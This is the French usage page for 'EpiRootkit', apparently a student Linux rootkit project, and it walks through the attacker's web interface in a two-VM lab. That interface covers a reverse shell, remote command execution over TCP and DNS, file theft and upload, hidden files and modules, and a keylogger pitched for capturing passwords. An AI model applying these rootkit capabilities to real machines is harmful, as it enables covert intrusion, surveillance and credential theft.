<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Utilisation</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d9/dc4/md_pages_2fr_204__usage.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Utilisation</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><li class="level1"><a href="#autotoc_md23">🌐 Interface Web</a><ul><li class="level2"><a href="#connexion">1. Connexion</a></li>
<li class="level2"><a href="#dashboard">2. Dashboard</a><ul><li class="level3"><a href="#autotoc_md24">✅ Connexion</a></li>
<li class="level3"><a href="#autotoc_md25">🛠 Actions</a></li>
<li class="level3"><a href="#autotoc_md26">🖥 Système</a></li>
<li class="level3"><a href="#reverse-shell">💻 Reverse shell</a></li>
<li class="level3"><a href="#autotoc_md27">💾 Disque</a></li>
<li class="level3"><a href="#autotoc_md28">📊 Ressources</a></li>
</ul>
</li>
<li class="level2"><a href="#terminal">3. Terminal</a><ul><li class="level3"><a href="#autotoc_md29">🖥️ Interface</a></li>
<li class="level3"><a href="#autotoc_md30">📄 Résultats</a></li>
<li class="level3"><a href="#autotoc_md31">🕘 Historique</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md32">4. Explorer</a><ul><li class="level3"><a href="#autotoc_md33">Victim&#39;s File Explorer</a></li>
<li class="level3"><a href="#autotoc_md34">File Upload</a></li>
<li class="level3"><a href="#autotoc_md35">Hidden dirs/files</a></li>
</ul>
</li>
<li class="level2"><a href="#keylogger">5. Keylogger</a><ul><li class="level3"><a href="#autotoc_md36">⌨️ Frappes</a></li>
<li class="level3"><a href="#autotoc_md37">🔍 Recherche</a></li>
<li class="level3"><a href="#autotoc_md38">📦 Exportation</a></li>
</ul>
</li>
</ul>
</li>
<li class="level1"><a href="#liste-des-commandes">📜 Liste des commandes</a></li>
</ul>
</div>
<div class="textblock"><p><a class="anchor" id="autotoc_md22"></a></p>
<p>L’utilisation du rootkit peut se faire soit en ligne de commande, soit via l’interface graphique intégrée. Nous allons ici décrire les deux méthodes.</p>
<blockquote class="doxtable">
<p>&zwj;Pour tirer pleinement parti de cette section, veuillez d’abord vous assurer que la mise en place a été correctement effectuée, comme décrit précédemment dans la section Mise en place. </p>
</blockquote>
<p>Dans un premier temps, nous expliquerons comment interagir avec l’interface web. Ensuite, nous détaillerons l’ensemble des commandes de base permettant d’interagir à distance avec le rootkit, accessibles aussi bien en ligne de commande (CLI) côté attaquant qu’à travers des boutons ou des champs de saisie dans l’interface graphique.</p>
<h1><a class="anchor" id="autotoc_md23"></a>
🌐 Interface Web</h1>
<blockquote class="doxtable">
<p>&zwj;<b>Remarque :</b> L’interface web fonctionne généralement de manière fiable. Toutefois, des performances insuffisantes sur la machine d’attaque peuvent entraîner des dysfonctionnements, notamment lors de la gestion de nombreuses requêtes réseau ou d’opérations coûteuses (transfert de fichiers, exécution de commandes complexes, etc.). Cela peut se traduire par des affichages incorrects ou des erreurs lors de l’utilisation de certaines fonctionnalités. Si cela arrive, la meilleure solution est toujours de redémarrer le serveur web. Ainsi, avant de signaler un problème, assurez-vous que votre machine dispose de ressources suffisantes et relisez ce paragraphe afin d'être certain que vous l'avez bien lu et pris en considération. Merci. </p>
</blockquote>
<h2><a class="anchor" id="connexion"></a>
1. Connexion</h2>
<p>Normalement, à ce stade, vous devriez avoir les deux machines virtuelles ouvertes, avec le serveur Python en cours d’exécution. Si vous vous rendez sur l'interface web de l'attaquant (<a href="http://192.168.100.2:5000/">http://192.168.100.2:5000/</a>), vous devriez voir l'interface d'accueil du rootkit. Si le rootkit n'est pas encore connecté, vous aurez un écran similaire à celui-ci :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/disconnected.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit disconnected.
  </figcaption>
</figure>
</p>
<p>Lorsque le rootkit sera détecté puis connecté au server TCP du backend, l'interface changera pour devenir :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/connect.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit connected.
  </figcaption>
</figure>
</p>
<p>Cependant une authentification est nécessaire pour accéder à l’ensemble des fonctionnalités et contrôler la machine victime à distance. Cliquez ensuite sur Authenticate et saisissez le mot de passe <code>evannounet</code>. Après quelques instants, le tableau de bord principal de l’application devrait s’afficher :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/authent.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui while authenticating.
  </figcaption>
</figure>
</p>
<blockquote class="doxtable">
<p>&zwj;Pour plus d’informations techniques concernant la gestion du mot de passe, voir <a class="el" href="../../df/d99/password.html#gestion-du-mot-de-passe">Gestion du mot de passe</a>. </p>
</blockquote>
<h2><a class="anchor" id="dashboard"></a>
2. Dashboard</h2>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/dash.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's dashboard after authentication.
  </figcaption>
</figure>
</p>
<p>Une fois connecté et authentifié, le tableau de bord principal (dashboard) s’affiche. Il permet un aperçu global de l’état de la machine cible, ainsi qu’un accès rapide à certaines fonctionnalités du rootkit. Voici les différents éléments présents ci-dessous.</p>
<h3><a class="anchor" id="autotoc_md24"></a>
✅ Connexion</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Élément   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Status</b>   </td><td class="markdownTableBodyLeft">Indique que le rootkit est bien connecté à la machine cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>IP</b>   </td><td class="markdownTableBodyLeft">Adresse IP locale de la machine cible (ici <code>192.168.100.3</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Port</b>   </td><td class="markdownTableBodyLeft">Port utilisé pour la connexion (ici <code>4242</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Time</b>   </td><td class="markdownTableBodyLeft">Heure actuelle sur la machine victime.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Last Command</b>   </td><td class="markdownTableBodyLeft">Affiche la dernière commande envoyée à la cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Avertissement VM</b>   </td><td class="markdownTableBodyLeft">Affiche un message d’alerte si le rootkit détecte un environnement virtuel.   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md25"></a>
🛠 Actions</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Action   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Disconnect</b>   </td><td class="markdownTableBodyLeft">Permet de fermer proprement la connexion avec la cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Kill rootkit</b>   </td><td class="markdownTableBodyLeft">Met un terme à l’exécution du rootkit sur la machine cible   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md26"></a>
🖥 Système</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Élément   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Architecture</b>   </td><td class="markdownTableBodyLeft">Architecture processeur de la machine (ici <code>x86_64</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>CPU Cores</b>   </td><td class="markdownTableBodyLeft">Nombre de cœurs processeur détectés (ici <code>1 cœur</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>CPU Model</b>   </td><td class="markdownTableBodyLeft">Nom du processeur ou de l’émulateur utilisé (ici <code>QEMU Virtual CPU</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Hostname</b>   </td><td class="markdownTableBodyLeft">Nom d’hôte de la machine (ici <code>victim</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>RAM</b>   </td><td class="markdownTableBodyLeft">Quantité totale de RAM disponible (ici <code>3889 Mo</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Version kernel</b>   </td><td class="markdownTableBodyLeft">Version du noyau Linux (ici <code>6.8.0-60-generic</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Version OS</b>   </td><td class="markdownTableBodyLeft">Détail de la distribution Linux et son build.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Virtual Env</b>   </td><td class="markdownTableBodyLeft">Indique si la machine semble tourner dans une VM (ici <code>true</code>).   </td></tr>
</table>
</div> <h3><a class="anchor" id="reverse-shell"></a>
💻 Reverse shell</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Élément   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Champ de port</b>   </td><td class="markdownTableBodyLeft">Permet de spécifier un port sur lequel ouvrir un shell inversé.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Launch Shell</b>   </td><td class="markdownTableBodyLeft">Lance le shell distant sur le port défini.   </td></tr>
</table>
</div><blockquote class="doxtable">
<p>&zwj;<b>Attention :</b> Le bouton <em>Launch Shell</em> ouvre un terminal Kitty sur la machine d'attaque. Par conséquent, le serveur web <b>et</b> le navigateur doivent être lancés directement depuis la VM d'attaque pour que cette fonctionnalité fonctionne correctement (voir <a class="el" href="../../dd/dc9/md_pages_2fr_203__install.html#equivalents-attaque">équivalent des commandes</a>). De plus, le bouton démarre un shell Kitty et attend 2 secondes avant d'envoyer l'instruction de connexion à la victime. Cependant, une machine hôte avec de faibles performances peut entrainer un démarrage trop long du shell, ce qui ne le rendra pas disponible à temps pour recevoir la connexion du rootkit. Dans ce cas, il est recommandé d'essayer de se déconnecter-reconnecter du rootkit afin de réessayer (oui cela peut fonctionner) ou de lancer le shell manuellement en effectuant la procédure décrite dans la section <a class="el" href="../../dd/de6/reverse.html#reverse-shell-reception">Reverse Shell</a>. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md27"></a>
💾 Disque</h3>
<p>Un aperçu est fourni via la commande distante <code>df -h</code> exécutée sur la machine virtuelle victime, indiquant les différentes partitions, leur taille, l’espace utilisé/disponible et leur point de montage.</p>
<h3><a class="anchor" id="autotoc_md28"></a>
📊 Ressources</h3>
<p>Un petit graphique à droite affiche en temps réel : </p><div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Ressource   </th><th class="markdownTableHeadLeft">Couleur d'affichage    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>CPU (%)</b>   </td><td class="markdownTableBodyLeft">Rouge    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>RAM (%)</b> n   </td><td class="markdownTableBodyLeft">Bleu   </td></tr>
</table>
</div><h2><a class="anchor" id="terminal"></a>
3. Terminal</h2>
<p>L’onglet <b>Terminal</b> permet de prendre le contrôle de la machine cible à distance en exécutant des commandes comme si l’on utilisait un terminal local.  
<figure style="text-align: center;">
  <img 
    src="../../../img/terminal.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's terminal interface for remote command execution.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md29"></a>
🖥️ Interface</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Élément   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Commande</b>   </td><td class="markdownTableBodyLeft">Saisissez ici une commande Unix/Linux classique (ex. : <code>ls -la</code>, <code>whoami</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Send</b>   </td><td class="markdownTableBodyLeft">Permet d’envoyer la commande à la machine cible.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Mode TCP</b>   </td><td class="markdownTableBodyLeft">Connexion directe via TCP. Timeout de 5 s. côté rootkit pour éviter les blocages (ex. : <code>ping</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Mode DNS</b>   </td><td class="markdownTableBodyLeft">Commande via DNS. Timeout de 30 s.   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md30"></a>
📄 Résultats</h3>
<div class="full_width_table"> Les résultats de l'exécution apparaissent dans deux blocs distincts : <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Élément   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>stdout</b>   </td><td class="markdownTableBodyLeft">Contenu de la sortie standard de la commande.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>stderr</b>   </td><td class="markdownTableBodyLeft">Contenu de la sortie d’erreur de la commande.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Code de sortie</b>   </td><td class="markdownTableBodyLeft">Code de terminaison de la commande   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md31"></a>
🕘 Historique</h3>
<p>En bas de l’écran, une section intitulée <em>Command history</em> permet de consulter les commandes précédemment envoyées à la machine cible. Chaque commande est accompagnée de son résultat, affiché dans un bloc repliable afin de préserver la lisibilité de l’interface. Cette fonctionnalité facilite à la fois le suivi des actions réalisées, le débogage en cas de problème, et la réutilisation rapide de commandes fréquentes.</p>
<h2><a class="anchor" id="autotoc_md32"></a>
4. Explorer</h2>
<p>L’onglet <b>Explorer</b> permet d’explorer le système de fichiers de la machine victime, offrant une vue hiérarchique des répertoires et des fichiers présents sur celle-ci.</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/explorer.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the file explorer interface in the attacker's web UI.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md33"></a>
Victim's File Explorer</h3>
<p>La partie de gauche de l’interface affiche la structure des répertoires de la machine victime. Vous pouvez naviguer dans les dossiers en cliquant sur les noms des répertoires. Les fichiers et sous-répertoires sont listés avec leurs noms, dans un ordre alphabétique en commençant par les répertoires, suivis des fichiers. Les répertoires sont indiqués par une icône de dossier, tandis que les fichiers sont représentés par une icône de document. Lors du survol d'un fichier, deux icônes apparaissent à droite de la barre de sélection :</p><ul>
<li><b>📥 Télécharger</b> : Permet de télécharger le fichier sélectionné sur la machine attaquante.</li>
<li><b>❌ Supprimer</b> : Permet de supprimer le fichier sélectionné de la machine victime.</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Le téléchargement se fait en deux étapes : d'abord le fichier est transféré de la machine victime vers le serveur web (machine) de l'attaquant. Ensuite, il est ensuite téléchargé sur la machine attaquante via le navigateur. Une fois le fichier téléchargé, son nom apparait dans la section <b>Downloaded Files</b>, où il peut être téléchargé à nouveau via le navigateur ou supprimé. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md34"></a>
File Upload</h3>
<p>La partie de droite de l’interface permet de télécharger des fichiers depuis la machine attaquante vers la machine victime. Vous pouvez sélectionner un fichier à partir de votre système local en cliquant sur le bouton <b>Browse</b>. Une fois le fichier sélectionné, le path de destination sur la machine victime est affiché dans le champ de saisie. Vous pouvez alors modifier le nom du fichier directement dans le champ de saisie ou le path de destination (par défaut la position actuelle dans l'explorateur) en cliquant dessus, ce qui fera apparaitre un champ de saisie modifiable. Une fois le nom du fichier ou le path de destination modifié, vous pouvez cliquer sur le bouton <b>Upload</b> pour envoyer le fichier vers la machine victime.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Il n'y a pas de contrainte de type de fichier, vous pouvez envoyer n'importe quel fichier, qu'il soit exécutable ou non. Pour ce qui est de la taille maximum, celle-ci est théoriquement de 4TB (voir l'explication du <a class="el" href="../../d5/dc4/network.html#tcp-protocole">protocole utilisé</a> pour plus de détails). </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md35"></a>
Hidden dirs/files</h3>
<p>La dernière partie de l'interface permet d'afficher les fichiers et dossiers masqués par le rootkit (voir commande <code>hooks list_hide</code> dans la <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#liste-des-commandes">liste des commandes</a>). Les afficher ici permet d'avoir connaissance de leur existance malgré leur absence visuelle de l'explorateur de fichiers.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Il est toujours possible de manipuler ces fichiers et dossier masqués mais il faudra pour cela passer par le <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#terminal">Terminal</a>. </p>
</blockquote>
<h2><a class="anchor" id="keylogger"></a>
5. Keylogger</h2>
<p>L’onglet <b>Keylogger</b> permet de récupérer les frappes clavier effectuées sur la machine victime. Cette fonctionnalité est particulièrement utile pour collecter des mots de passe, des requêtes tapées dans un navigateur, ou encore pour surveiller l’activité de la victime.  
<figure style="text-align: center;">
  <img 
    src="../../../img/keylogger.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the keylogger interface in the attacker's web UI.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md36"></a>
⌨️ Frappes</h3>
<p>Une zone de texte centrale affiche le contenu capturé par le module de keylogging sous forme brute, sans mise en forme, exactement tel qu’il est stocké sur la machine cible. Le bouton <em>Fetch data</em> permet de récupérer les nouvelles frappes enregistrées depuis le module rootkit. L’état du module est représenté par un <em>switch ON/OFF</em> : lorsqu’il est activé, toutes les frappes clavier sont enregistrées en temps réel ; lorsqu’il est désactivé, aucune donnée n’est collectée.</p>
<h3><a class="anchor" id="autotoc_md37"></a>
🔍 Recherche</h3>
<p>Un champ de recherche permet de filtrer dynamiquement les résultats affichés. Deux modes sont disponibles : en mode <em>Normal</em>, la recherche s’effectue en texte brut, tandis que le mode <em>RegEx</em> active la prise en charge des expressions régulières, offrant ainsi des possibilités de filtrage avancées. Une fois les critères saisis, le bouton <em>Search</em> permet d’appliquer le filtre sur les données visibles.</p>
<h3><a class="anchor" id="autotoc_md38"></a>
📦 Exportation</h3>
<p>Le bouton <em>Download as .txt</em> permet de télécharger l’ensemble des frappes capturées sous forme d’un fichier <code>.txt</code> directement sur la machine attaquante.</p>
<h1><a class="anchor" id="liste-des-commandes"></a>
📜 Liste des commandes</h1>
<p>La liste des commandes décrites ci-dessous sont des commandes propres à Epirootkit, qui peuvent être saisies dans le terminal de la machine attaquante après s’être connecté au rootkit. Beaucoup de ces commandes sont également accessibles de manière indirecte via l’interface web, que ce soit par des boutons ou des champs de saisie. Cela n'est cependant pas le cas de toutes les commandes, certaines étant réservées à un usage en ligne de commande (CLI) pour des raisons de sécurité ou de complexité et c'est pour cette usage que nous les décrivons ici.</p>
<p>Voici la liste des commandes disponibles, regroupées par thème :</p>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Thème   </th><th class="markdownTableHeadNone">Commandes    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Accès   </td><td class="markdownTableBodyNone"><a href="#connect">connect</a> │ <a href="#disconnect">disconnect</a> │ <a href="#killcom">killcom</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Authentification   </td><td class="markdownTableBodyNone"><a href="#help">help</a> │ <a href="#passwd">passwd</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Contrôle système   </td><td class="markdownTableBodyNone"><a href="#exec">exec</a> │ <a href="#getshell">getshell</a> │ <a href="#sysinfo">sysinfo</a> │ <a href="#is_in_vm">is_in_vm</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Keylogger   </td><td class="markdownTableBodyNone"><a href="#klgon">klgon</a> │ <a href="#klgoff">klgoff</a> │ <a href="#klg">klg</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Masquage module   </td><td class="markdownTableBodyNone"><a href="#hide_module">hide_module</a> │ <a href="#unhide_module">unhide_module</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Fichiers   </td><td class="markdownTableBodyNone"><a href="#get_file">get_file</a> │ <a href="#upload">upload</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Diagnostic   </td><td class="markdownTableBodyNone"><a href="#ping">ping</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Chiffrement   </td><td class="markdownTableBodyNone"><a href="#cipher">cipher</a> │ <a href="#uncipher">uncipher</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks (général)   </td><td class="markdownTableBodyNone"><a href="#hooks-help">hooks help</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Hooks : fichiers   </td><td class="markdownTableBodyNone"><a href="#hooks-hide">hooks hide</a> │ <a href="#hooks-unhide">hooks unhide</a> │ <a href="#hooks-list_hide">hooks list_hide</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks : interdiction   </td><td class="markdownTableBodyNone"><a href="#hooks-forbid">hooks forbid</a> │ <a href="#hooks-unforbid">hooks unforbid</a> │ <a href="#hooks-list_forbid">hooks list_forbid</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Hooks : modification   </td><td class="markdownTableBodyNone"><a href="#hooks-modify">hooks modify</a> │ <a href="#hooks-unmodify">hooks unmodify</a> │ <a href="#hooks-list_modify">hooks list_modify</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks : ports   </td><td class="markdownTableBodyNone"><a href="#hooks-add_port">hooks add_port</a> │ <a href="#hooks-remove_port">hooks remove_port</a> │ <a href="#hooks-list_port">hooks list_port</a>   </td></tr>
</table>
</div> <details  open="true">
<summary  id="help">
<b>1. 🆘 help</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">help</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche un menu récapitulatif de toutes les commandes disponibles pour l'attaquant. Certaines commandes affichées sont optimisées pour l'interface Web.</p>
<p></p>
</details>
<details  open="true">
<summary  id="connect">
<b>2. 🔌 connect</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">connect [PASSWORD]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Permet d'authentifier l'attaquant pour accéder au rootkit à distance.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PASSWORD</b> : Mot de passe d'authentification au rootkit (par défaut <code>evannounet</code>)</li>
</ul>
<p><b>Notes importantes</b></p><ul>
<li>La connexion est nécessaire pour exécuter d'autres commandes</li>
<li>Seules les commandes <a href="#help">help</a>, <a href="#connect">connect</a> et <a href="#ping">ping</a> sont accessibles sans authentification</li>
<li>Le mot de passe peut être modifié ultérieurement avec la commande <a href="#passwd">passwd</a> </li>
</ul>
</details>
<details  open="true">
<summary  id="disconnect">
<b>3. 🔌 disconnect</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">disconnect</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Commande complémentaire de <a href="#connect">connect</a>. Permet de se déconnecter proprement du rootkit distant.</p>
<p><b>Comportement</b></p><ul>
<li>Une reconnexion sera nécessaire pour saisir de nouvelles commandes</li>
<li>Ne termine pas l'execution du rootkit contrairement à <a href="#killcom">killcom</a>.</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="ping">
<b>4. 📡 ping</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">ping</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Teste la connectivité du rootkit.</p>
<p><b>Réponse attendue</b></p><ul>
<li><b>Succès</b> : La console renvoie <code>pong</code></li>
<li><b>Échec</b> : Aucune réponse ou erreur de connexion</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="passwd">
<b>5. 🔐 passwd</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">passwd [PASSWORD]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Modifie le mot de passe actuellement utilisé pour se connecter au rootkit.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PASSWORD</b> : Nouveau mot de passe</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Le mot de passe est haché automatiquement</li>
